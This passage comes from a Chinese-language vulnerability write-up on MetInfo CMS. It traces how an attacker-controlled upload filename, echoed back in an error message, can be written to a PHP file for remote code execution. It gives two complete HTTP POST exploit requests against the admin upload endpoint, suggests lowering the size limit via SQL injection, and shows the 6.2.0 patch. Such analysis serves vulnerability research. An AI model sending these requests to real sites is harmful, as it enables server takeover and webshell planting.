        $back = $this->upfile->upload($formname);
        return $back;
    }
    ...
    public function doupfile(){
        global $_M;
        $this->upfile->set_upfile();
        $info['savepath'] = $_M['form']['savepath'];
        $info['format'] = $_M['form']['format'];
        $info['maxsize'] = $_M['form']['maxsize'];
        $info['is_rename'] = $_M['form']['is_rename'];
        $info['is_overwrite'] = $_M['form']['is_overwrite'];
        $this->set_upload($info);
        $back = $this->upload($_M['form']['formname']);
        if($_M['form']['type']==1){
            if($back['error']){
                $back['error'] = $back['errorcode'];
            }else{
                $backs['path'] = $back['path'];
                $backs['append'] = 'false';
                $back = $backs;
            }
        }
        $back['filesize'] =  round(filesize($back['path'])/1024,2);
        echo jsonencode($back);
    }
    ...
echo的$back变量是从`$_M['form']['formname']`取出来的，可控，向上推看back变量的取值由`$this->upfile->upload($formname)`决定，跟进。
    public function upload($form = '') {
        global $_M;
        if($form){
            foreach($_FILES as $key => $val){
                if($form == $key){
                    $filear = $_FILES[$key];
                }
            }
        }
        if(!$filear){
            foreach($_FILES as $key => $val){
                $filear = $_FILES[$key];
                break;
            }
        }
        //是否能正常上传
        if(!is_array($filear))$filear['error'] = 4;
        if($filear['error'] != 0 ){
            $errors = array(
                0 => $_M['word']['upfileOver4'],
                1 => $_M['word']['upfileOver'],
                2 => $_M['word']['upfileOver1'],
                3 => $_M['word']['upfileOver2'],
                4 => $_M['word']['upfileOver3'],
                6 => $_M['word']['upfileOver5'],
                7 => $_M['word']['upfileOver5']
            );
            $error_info[]= $errors[$filear['error']] ? $errors[$filear['error']] : $errors[0];
            return $this->error($errors[$filear['error']]);
        }
        ...
        //文件大小是否正确{}
        if ($filear["size"] > $this->maxsize || $filear["size"] > $_M['config']['met_file_maxsize']*1048576) {
            return $this->error("{$_M['word']['upfileFile']}".$filear["name"]." {$_M['word']['upfileMax']} {$_M['word']['upfileTip1']}");
        }
        //文件后缀是否为合法后缀
        $this->getext($filear["name"]); //获取允许的后缀
        if (strtolower($this->ext)=='php'||strtolower($this->ext)=='aspx'||strtolower($this->ext)=='asp'||strtolower($this->ext)=='jsp'||strtolower($this->ext)=='js'||strtolower($this->ext)=='asa') {
            return $this->error($this->ext." {$_M['word']['upfileTip3']}");
        }
        ...
    }
省略部分代码
我们要看return回去的值就是back变量的值，所以重点关注return的东西看是否可控。
首先是正常foreach取出上传文件的信息，然后判断是否能正常上传-文件大小是否正确-文件后缀是否为合法后缀，如果有错就return。到这里有两种思路。
## 超出文件大小getshell
在后台中最大文件大小是8m，如果我们上传一个超出8m的文件，那么upload()函数就会`return
$this->error("{$_M['word']['upfileFile']}".$filear["name"]."
{$_M['word']['upfileMax']} {$_M['word']['upfileTip1']}");`
而这个`$filear["name"]`是我们可控的，在foreach中赋值的。
那么这样我们就可以把`$filear["name"]`改为shell，然后return回去，赋值给$back，echo进缓冲区，最后file_put_contents拿到shell，完美的利用链。
但是这个8m太大了， **我们可以通过注入进后台把这个限制改为0.0008**
构造下payload， **需要注意`metinfonow`参数是上文中从数据库中取出的`met_member_force`**
    POST /admin/index.php?c=uploadify&m=include&a=doupfile&lang=cn&metinfonow=xwtpwmp&html_filename=1.php HTTP/1.1
    Host: php.local
    Content-Length: 1120
    Origin: http://php.local
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8tQiXReYsQYXHadW
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    ------WebKitFormBoundary8tQiXReYsQYXHadW
    Content-Disposition: form-data; name="test"; filename=""
    Content-Type: image/jpeg
    testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
    ------WebKitFormBoundary8tQiXReYsQYXHadW--    
## 无后缀getshell
[@mochazz](https://github.com/mochazz
"@mochazz")师傅在先知上分享了一篇metinfo6.1.3的getshell，我自己测试在6.2.0中已经修复，不过还是提一下。
问题出在 app/system/include/class/upfile.class.php:139 getext()函数
如果不是合法后缀会`return $this->error($this->ext."
{$_M['word']['upfileTip3']}")`，而`$this->ext`经过`getext()`函数，跟进
    protected function getext($filename) {
        if ($filename == "") {
            return ;
        }
        $ext = explode(".", $filename);
        $ext = $ext[count($ext) - 1];
        return $this->ext = $ext;
    }
直接`return $ext`，那么我们上传一个无后缀的文件，文件名写一句话就可以getshell
y  
payload
    POST /admin/index.php?c=uploadify&m=include&a=doupfile&lang=cn&metinfonow=xwtpwmp&html_filename=1.php HTTP/1.1
    Host: php.local
    Content-Length: 194
    Origin: http://php.local
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8tQiXReYsQYXHadW
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: XDEBUG_SESSION=PHPSTORM
    Connection: close
    ------WebKitFormBoundary8tQiXReYsQYXHadW
    Content-Disposition: form-data; name="test"; filename=""
    Content-Type: image/jpeg
    test
    ------WebKitFormBoundary8tQiXReYsQYXHadW--    
而在6.2.0中，加入了一行正则判断后缀，绕不过去，无法getshell
    protected function getext($filename) {
        if ($filename == "") {
            return ;
        }
        $ext = explode(".", $filename);
        $ext = $ext[count($ext) - 1];
        if (preg_match("/^[0-9a-zA-Z]+$/u", $ext)) {
            return $this->ext = $ext;
        }
        return $this->ext = '';
    } 
## 总结
  1. svn泄露分版本
  2. 注册是邮件的正则匹配问题
  3. 参数加密一般不走全局过滤 找找注入
  4. 关注echo和ob_get_contents()函数 说不定能写shell呢
参考链接
  1. 
  2. 
**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**